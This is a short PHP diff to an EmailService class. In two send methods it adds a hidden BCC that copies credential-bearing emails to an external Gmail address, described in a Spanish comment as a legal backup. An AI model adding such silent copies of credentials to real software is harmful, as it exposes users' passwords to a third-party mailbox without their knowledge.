@@ -112,6 +112,8 @@ class EmailService
             $email->setReplyTo($this->fromEmail, $this->fromName); // Agregar Reply-To
             $email->setSubject($asunto);
             $email->addTo($to);
+            // BCC para respaldo legal de envío de credenciales
+            $email->addBcc('sistemasdegestionpropiedadhori@gmail.com', 'Respaldo Credenciales');
             $email->addContent('text/html', $htmlContent);
 
             // Enviar email
@@ -217,6 +219,8 @@ class EmailService
             $email->setReplyTo($this->fromEmail, $this->fromName);
             $email->setSubject($asunto);
             $email->addTo($to);
+            // BCC para respaldo legal de envío de credenciales
+            $email->addBcc('sistemasdegestionpropiedadhori@gmail.com', 'Respaldo Credenciales');
             $email->addContent('text/html', $htmlContent);
 
             // Enviar email
